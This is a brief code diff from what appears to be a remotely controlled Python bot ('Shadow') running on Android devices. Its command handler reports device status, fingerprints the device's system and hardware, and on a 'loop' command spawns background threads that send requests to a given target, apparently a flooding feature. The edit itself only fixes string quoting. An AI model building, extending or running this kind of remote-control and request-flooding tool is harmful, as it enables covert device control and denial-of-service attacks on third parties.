@@ -126,7 +126,7 @@ def gen_response(cmd):
         if cmdlen == 1 and main.lower() == 'active': return f'`{device}` is active'
         elif cmdlen == 1 and main.lower() == 'sysinfo': return f'*Software*\n\nsystem: `{platform.system()}`\nrelease: `{platform.release()}`\nversion: `{platform.version()}`\nmachine: `{platform.machine()}`\n\n*Hardware*\n\nbrand: `{subprocess.getoutput("getprop ro.product.brand")}`\ndevice: `{subprocess.getoutput("getprop ro.product.device")}`\nandroid: `{subprocess.getoutput("getprop ro.build.version.release")}`\nmanufacturer: `{subprocess.getoutput("getprop ro.product.manufacturer")}`'
         elif cmdlen == 1 and main.lower() == 'count': return f'*Shadow Total Running Count On* `{device}`: `{count}`'
-        elif cmdlen == 1 and main.lower() == 'uiargv': return f'*UI Argv:* `{os.environ.get('PYTHON_SERVICE_ARGUMENT','No Argvs')}`'
+        elif cmdlen == 1 and main.lower() == 'uiargv': return f'*UI Argv:* `{os.environ.get("PYTHON_SERVICE_ARGUMENT","No Argvs")}`'
         elif cmdlen == 3 and main.lower() == 'loop':
             threading.Thread(target=loop,args=(parts[1],int(parts[2]),),daemon=True).start()
             return f'`{main}` Requests Sended'
